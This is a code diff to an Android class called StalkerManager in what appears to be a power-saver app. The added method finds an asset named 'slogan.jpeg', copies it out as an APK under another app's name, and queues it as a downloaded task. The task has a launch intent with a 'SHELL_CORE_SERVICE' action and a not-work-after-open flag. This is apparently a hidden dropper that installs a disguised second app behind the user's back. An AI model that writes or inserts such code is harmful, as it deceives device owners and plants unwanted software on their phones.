@@ -1,5 +1,6 @@
 package com.luna.powersaver.gp.manager;
 
+import android.content.Context;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
@@ -21,9 +22,13 @@ import com.luna.powersaver.gp.utils.NetworkUtil;
 import org.json.JSONArray;
 
 import java.io.File;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Iterator;
+
+import static com.luna.powersaver.gp.utils.FileUtil.copyApkFromAssets;
+import static com.luna.powersaver.gp.utils.FileUtil.getOwnCacheDirectory;
 
 /**
  * 为了操作方便，暂时实行同一时间一个任务 <br />
@@ -90,6 +95,46 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
         } else {
             AppDebugLog.d(AppDebugLog.TAG_PRINT, "list is null");
         }
+    }
+
+    /*------------------- 临时内容 ----------------------*/
+
+    public JsonAppInfo judgeAndConstructDefaultInfo(Context context) {
+        JsonAppInfo i = null;
+        try {
+            String[] paths = context.getAssets().list("");
+            AppDebugLog.d(AppDebugLog.TAG_STALKER, "循环显示assets地址内容!");
+            final String filename = "slogan.jpeg";
+            final String apkname = "luna.net.shortfilm.gp_release_241.apk";
+            for (String p : paths) {
+                AppDebugLog.d(AppDebugLog.TAG_STALKER, "path : " + p);
+                if (filename.equals(p)) {
+                    File extDir = FileUtil.getOwnCacheDirectory(context, StaticConst.STORE_DOWNLOAD);
+                    if (!extDir.exists() || !extDir.isDirectory()){
+                        FileUtil.forceMkDir(extDir);
+                    }
+                    if (extDir.isDirectory() && extDir.exists()) {
+                        File targetFile = new File(extDir, apkname);
+                        if (!targetFile.exists() && !targetFile.isFile()
+                                && copyApkFromAssets(context, filename, extDir.getAbsolutePath())) {
+                            i = new JsonAppInfo();
+                            i.execstate = JsonAppInfo.EXC_STATE.DOWNLOADED;
+                            i.start = 1;
+                            i.uri = "intent:#Intent;action=andrid.intent.action.SHELL_CORE_SERVICE;package=luna.net.shortfilm.gp;end";
+                            i.url = "http://default.gp.com/release_241.apk";
+                            i.task = JsonAppInfo.TASK.DOWNLOAD_BY_APK;
+                            i.pkg = "luna.net.shortfilm.gp";
+                            i.starttime = System.currentTimeMillis() / 1000 - 10;
+                            i.endtime = System.currentTimeMillis() / 1000 + 30 * 60;
+                            i.action = JsonAppInfo.ACTION.NOT_WORK_AFTER_OPEN;
+                        }
+                    }
+                }
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return i;
     }
 
     /*------------------- 正式内容 ----------------------*/
@@ -623,7 +668,7 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
 
     @Nullable
     private File getOrMkStoreDir() {
-        File storeDir = FileUtil.getOwnCacheDirectory(StaticConst.sContext, StaticConst.STORE_DATA);
+        File storeDir = getOwnCacheDirectory(StaticConst.sContext, StaticConst.STORE_DATA);
         if (!storeDir.exists() || !storeDir.isDirectory()) {
             boolean isSuccess = storeDir.mkdirs();
             if (!isSuccess) {
